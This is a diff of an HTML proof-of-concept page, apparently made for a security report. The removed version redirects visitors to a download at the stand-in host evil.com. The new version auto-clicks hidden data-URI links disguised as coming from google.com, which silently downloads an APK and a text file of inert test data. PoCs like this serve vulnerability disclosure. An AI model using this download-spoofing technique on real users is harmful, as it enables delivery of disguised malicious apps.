@@ -1,3 +1,31 @@
-<script>
-window.location.href = "https://evil.com/download.php";
-</script>
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Download Origin Test PoC</title>
+</head>
+<body>
+  <center><h2>POC by pajarpriandana</h2></center>
+
+  <a id="apk"
+     href="data://google.com/application/vnd.android.package-archive;base64,UE9DX1RFU1RfREFUQQ=="
+     download="google.apk"
+     style="display:none;">
+  </a>
+
+  <a id="txt"
+     href="data://google.com/text/plain;base64,UE9DX1RFU1RfREFUQQ=="
+     download="google1.txt"
+     style="display:none;">
+  </a>
+
+  <script>
+    window.onload = function () {
+      document.getElementById('apk').click();
+      setTimeout(function () {
+        document.getElementById('txt').click();
+      }, 1000);
+    };
+  </script>
+</body>
+</html>
